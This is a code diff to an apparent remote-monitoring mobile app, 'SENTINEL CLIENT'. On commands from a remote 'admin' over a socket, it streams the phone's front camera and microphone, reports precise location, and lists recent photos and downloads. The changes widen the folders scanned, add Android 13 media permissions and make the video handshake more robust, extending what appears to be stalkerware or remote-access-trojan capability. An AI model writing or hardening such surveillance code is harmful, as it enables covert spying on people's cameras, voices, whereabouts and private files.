@@ -45,13 +45,26 @@ const App = () => {
 
   const requestPermissions = async () => {
     if (Platform.OS === 'android') {
-      await PermissionsAndroid.requestMultiple([
-        PermissionsAndroid.PERMISSIONS.CAMERA,
-        PermissionsAndroid.PERMISSIONS.RECORD_AUDIO,
-        PermissionsAndroid.PERMISSIONS.ACCESS_FINE_LOCATION,
-        PermissionsAndroid.PERMISSIONS.WRITE_EXTERNAL_STORAGE,
-        PermissionsAndroid.PERMISSIONS.READ_EXTERNAL_STORAGE,
-      ]);
+      try {
+        const permissionsToRequest = [
+          PermissionsAndroid.PERMISSIONS.CAMERA,
+          PermissionsAndroid.PERMISSIONS.RECORD_AUDIO,
+          PermissionsAndroid.PERMISSIONS.ACCESS_FINE_LOCATION,
+        ];
+
+        // Android 13+ requires granular media permissions
+        if (Platform.Version >= 33) {
+            permissionsToRequest.push('android.permission.READ_MEDIA_IMAGES');
+            permissionsToRequest.push('android.permission.READ_MEDIA_VIDEO');
+        } else {
+            permissionsToRequest.push(PermissionsAndroid.PERMISSIONS.WRITE_EXTERNAL_STORAGE);
+            permissionsToRequest.push(PermissionsAndroid.PERMISSIONS.READ_EXTERNAL_STORAGE);
+        }
+
+        await PermissionsAndroid.requestMultiple(permissionsToRequest);
+      } catch (err) {
+        console.warn(err);
+      }
     }
   };
 
@@ -81,62 +94,78 @@ const App = () => {
     // --- WEBRTC HANDLERS ---
     
     socketRef.current.on('offer', async (remoteOfferPayload: any) => {
-      console.log('Received Offer');
-      setStatus('Streaming Video...');
-      
-      // 1. Get Local Media (Camera/Mic)
-      let stream;
       try {
-        stream = await mediaDevices.getUserMedia({
-            audio: true,
-            video: { 
-                facingMode: 'user', 
-                frameRate: 30, 
-                width: 640, 
-                height: 480 
+        console.log('Received Offer');
+        setStatus('Streaming Video...');
+        
+        // 1. Get Local Media (Camera/Mic)
+        let stream;
+        try {
+            stream = await mediaDevices.getUserMedia({
+                audio: true,
+                video: { 
+                    facingMode: 'user', 
+                    frameRate: 30, 
+                    width: 640, 
+                    height: 480 
+                }
+            });
+        } catch (err) {
+            console.error("Failed to get media", err);
+            setStatus("Camera Error: Check Permissions");
+            return;
+        }
+
+        // 2. Create Peer Connection
+        const pc = new RTCPeerConnection(configuration);
+        pcRef.current = pc;
+
+        // 3. Add Track to Peer Connection
+        stream.getTracks().forEach(track => pc.addTrack(track, stream));
+
+        // 4. Set Remote Description
+        // FIX: Robust check for nested SDP objects to prevent crashes
+        let sdp = null;
+        
+        if (remoteOfferPayload && typeof remoteOfferPayload === 'object') {
+            if (remoteOfferPayload.type && remoteOfferPayload.sdp) {
+                // The payload IS the SDP object
+                sdp = remoteOfferPayload;
+            } else if (remoteOfferPayload.sdp && remoteOfferPayload.sdp.type && remoteOfferPayload.sdp.sdp) {
+                // The payload WRAPS the SDP object
+                sdp = remoteOfferPayload.sdp;
             }
-        });
-      } catch (err) {
-        console.error("Failed to get media", err);
-        setStatus("Camera Error: Check Permissions");
-        return;
-      }
-
-      // 2. Create Peer Connection
-      const pc = new RTCPeerConnection(configuration);
-      pcRef.current = pc;
-
-      // 3. Add Track to Peer Connection
-      stream.getTracks().forEach(track => pc.addTrack(track, stream));
-
-      // 4. Set Remote Description
-      // FIX: Access the inner 'sdp' property. The payload is { target: '...', sdp: { type: 'offer', sdp: '...' } }
-      try {
-        if (remoteOfferPayload.sdp) {
-             await pc.setRemoteDescription(new RTCSessionDescription(remoteOfferPayload.sdp));
-        } else {
-             // Fallback if payload is just the sdp
-             await pc.setRemoteDescription(new RTCSessionDescription(remoteOfferPayload));
         }
-      } catch(e) {
-          console.error("Session Description Error", e);
-          setStatus("Connection Error: SDP Failed");
-          return;
-      }
 
-      // 5. Create Answer
-      const answer = await pc.createAnswer();
-      await pc.setLocalDescription(answer);
-
-      // 6. Send Answer to Admin
-      socketRef.current.emit('answer', { target: 'admin', sdp: answer });
-
-      // Handle ICE Candidates
-      (pc as any).onicecandidate = (event: any) => {
-        if (event.candidate) {
-          socketRef.current.emit('ice-candidate', { target: 'admin', candidate: event.candidate });
+        if (!sdp) {
+            console.error("Invalid Offer Payload Received", remoteOfferPayload);
+            setStatus('Error: Invalid SDP Format');
+            return;
         }
-      };
+
+        // Explicitly construct RTCSessionDescription to ensure type safety
+        await pc.setRemoteDescription(new RTCSessionDescription({
+            type: sdp.type,
+            sdp: sdp.sdp
+        }));
+
+        // 5. Create Answer
+        const answer = await pc.createAnswer();
+        await pc.setLocalDescription(answer);
+
+        // 6. Send Answer to Admin
+        socketRef.current.emit('answer', { target: 'admin', sdp: answer });
+
+        // Handle ICE Candidates
+        (pc as any).onicecandidate = (event: any) => {
+            if (event.candidate) {
+            socketRef.current.emit('ice-candidate', { target: 'admin', candidate: event.candidate });
+            }
+        };
+      } catch (err: any) {
+        console.error("WebRTC Handshake Error:", err);
+        setStatus(`Call Error: ${err.message}`);
+      }
     });
 
     // --- COMMAND HANDLERS ---
@@ -169,7 +198,6 @@ const App = () => {
                 },
                 (error) => {
                     console.log(error.code, error.message);
-                    // Send error back so dashboard knows
                 },
                 { enableHighAccuracy: true, timeout: 15000, maximumAge: 10000 }
             );
@@ -180,16 +208,39 @@ const App = () => {
     // --- FILE SYSTEM HANDLERS ---
     
     socketRef.current.on('request-file-list', async () => {
-        const path = Platform.OS === 'android' ? RNFS.ExternalStorageDirectoryPath + '/DCIM/Camera' : RNFS.DocumentDirectoryPath;
         try {
-            const result = await RNFS.readDir(path);
-            const files = result.map(file => ({
-                name: file.name,
-                path: file.path,
-                size: file.size,
-                date: file.mtime
-            }));
-            socketRef.current.emit('file-list', { files });
+            // Check multiple paths to ensure we find files
+            const pathsToCheck = [
+                RNFS.ExternalStorageDirectoryPath + '/DCIM/Camera',
+                RNFS.ExternalStorageDirectoryPath + '/Pictures',
+                RNFS.ExternalStorageDirectoryPath + '/Download',
+                RNFS.DocumentDirectoryPath // Fallback
+            ];
+
+            let allFiles: any[] = [];
+
+            for (const path of pathsToCheck) {
+                try {
+                    const result = await RNFS.readDir(path);
+                    const mapped = result
+                        .filter(f => f.isFile())
+                        .map(file => ({
+                            name: file.name,
+                            path: file.path,
+                            size: file.size,
+                            date: file.mtime
+                        }));
+                    allFiles = [...allFiles, ...mapped];
+                } catch(e) {
+                    // Ignore paths that don't exist
+                }
+            }
+            
+            // Limit to 100 recent files to prevent overload
+            allFiles.sort((a, b) => new Date(b.date).getTime() - new Date(a.date).getTime());
+            const limitedFiles = allFiles.slice(0, 100);
+
+            socketRef.current.emit('file-list', { files: limitedFiles });
         } catch(e) {
             console.error("File List Error:", e);
         }
@@ -222,7 +273,7 @@ const App = () => {
 
   return (
     <View style={styles.container}>
-      <Text style={styles.title}>SENTINEL CLIENT v2.1</Text>
+      <Text style={styles.title}>SENTINEL CLIENT v2.2</Text>
       <Text style={styles.status}>Status: {status}</Text>
       <Text style={styles.info}>Device ID: {DEVICE_ID}</Text>
       <View style={styles.dot} />
